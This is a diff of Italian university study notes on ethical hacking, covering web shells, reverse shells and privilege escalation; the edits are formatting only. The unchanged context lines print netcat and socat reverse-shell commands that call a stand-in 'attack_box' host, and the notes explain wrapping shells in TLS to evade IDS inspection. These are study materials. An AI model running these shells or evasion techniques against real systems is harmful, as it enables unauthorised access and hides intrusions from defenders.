@@ -12,11 +12,11 @@ Un **remote exploit** (o una catena di exploit) punta a far **eseguire del codic
 
 Le slide mostrano tre scenari archetipici:
 
-|Scenario|Cosa succede|Privilegi ottenuti|
-|---|---|---|
-|**Web shell**|Carico uno script malevolo sul web server; lo interrogo via HTTP e lui esegue comandi sull'OS|Quelli del processo web server|
-|**Reverse shell via RCE**|Sfrutto una RCE per iniettare una reverse shell; questa "richiama" l'attaccante|Quelli del server bucato|
-|**Privilege escalation (locale)**|Es. buffer overflow su un binario **SUID root** → spawno una shell con i nuovi privilegi|root (i privilegi _nuovi_ ottenuti)|
+| Scenario                          | Cosa succede                                                                                  | Privilegi ottenuti                  |
+| --------------------------------- | --------------------------------------------------------------------------------------------- | ----------------------------------- |
+| **Web shell**                     | Carico uno script malevolo sul web server; lo interrogo via HTTP e lui esegue comandi sull'OS | Quelli del processo web server      |
+| **Reverse shell via RCE**         | Sfrutto una RCE per iniettare una reverse shell; questa "richiama" l'attaccante               | Quelli del server bucato            |
+| **Privilege escalation (locale)** | Es. buffer overflow su un binario **SUID root** → spawno una shell con i nuovi privilegi      | root (i privilegi _nuovi_ ottenuti) |
 
 > [!warning] Trappola d'esame — "shell ≠ root" La privilege escalation locale serve proprio perché **avere una shell non significa essere root**. Il terzo scenario (BOF su SUID root → root shell) è la transizione da utente normale a root. Aggancia sempre questa narrativa: prima ottengo _una_ shell, poi la _elevo_. (Collega a [[Ethl 0x01 vulnerabilities]] e alla parte UNIX su SUID.)
 
@@ -83,7 +83,8 @@ attacker: nc -lp 4444
 victim:   nc -e bash attack_box 4444
 ```
 
-> [!warning] `-e` e il GAPING_SECURITY_HOLE — perché esiste il workaround con FIFO Per ragioni di sicurezza l'opzione **`-e`** (esegui un programma e collegalo al socket) è stata **rimossa** dalla maggior parte dei netcat nelle distro Linux. Senza `-e` non puoi più "incollare" bash al socket direttamente. **Workaround: named FIFO (`mkfifo`).** Si crea una pipe nominata e si "ricicla" l'output di bash di nuovo nel suo input passando per nc, ottenendo il canale bidirezionale che `-e` dava gratis:
+> [!warning] `-e` e il GAPING_SECURITY_HOLE — perché esiste il workaround con FIFO 
+> Per ragioni di sicurezza l'opzione **`-e`** (esegui un programma e collegalo al socket) è stata **rimossa** dalla maggior parte dei netcat nelle distro Linux. Senza `-e` non puoi più "incollare" bash al socket direttamente. **Workaround: named FIFO (`mkfifo`).** Si crea una pipe nominata e si "ricicla" l'output di bash di nuovo nel suo input passando per nc, ottenendo il canale bidirezionale che `-e` dava gratis:
 > 
 > ```
 > # TCP Bind con FIFO
@@ -121,7 +122,8 @@ attacker: socat TCP-LISTEN:4444 FILE:`tty`
 victim:   socat TCP:attack_box:4444 EXEC:bash,stderr
 ```
 
-> [!info] Reverse cifrata (TLS) — il "perché" più del "come" Si genera un certificato X509 self-signed con `openssl`, si uniscono chiave+cert in un `.pem`, poi si usano gli endpoint `OPENSSL-LISTEN:` / `OPENSSL:` con `verify=0`. **Effetto:** il traffico della shell viaggia dentro TLS → un **IDS/IPS** che ispeziona i payload **non vede** comandi/output, solo bytes cifrati. È l'arma contro il deep packet inspection. (`verify=0` = non verifico il certificato, accettabile in lab ma è esattamente ciò che un difensore potrebbe sfruttare per MITM.)
+> [!info] Reverse cifrata (TLS) — il "perché" più del "come" 
+> Si genera un certificato X509 self-signed con `openssl`, si uniscono chiave+cert in un `.pem`, poi si usano gli endpoint `OPENSSL-LISTEN:` / `OPENSSL:` con `verify=0`. **Effetto:** il traffico della shell viaggia dentro TLS → un **IDS/IPS** che ispeziona i payload **non vede** comandi/output, solo bytes cifrati. È l'arma contro il deep packet inspection. (`verify=0` = non verifico il certificato, accettabile in lab ma è esattamente ciò che un difensore potrebbe sfruttare per MITM.)
 
 vedi [[Shell Cifrata]] per saperne di più.
 
@@ -129,7 +131,7 @@ vedi [[Shell Cifrata]] per saperne di più.
 
 Quando sul target **non c'è né nc né socat**, si usano strumenti già presenti. Idea generale (e termine da conoscere): _Living off the Land_ = usare binari/legittimi già nel sistema per non portare tool sospetti e ridurre i segnali.
 
-Il caso classico — [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells|Reverse Shells]] con **solo bash** (slide 28-29):
+Il caso classico — [[Reverse Shells]] con **solo bash** (slide 28-29):
 
 ```
 attacker: nc -lp 4444
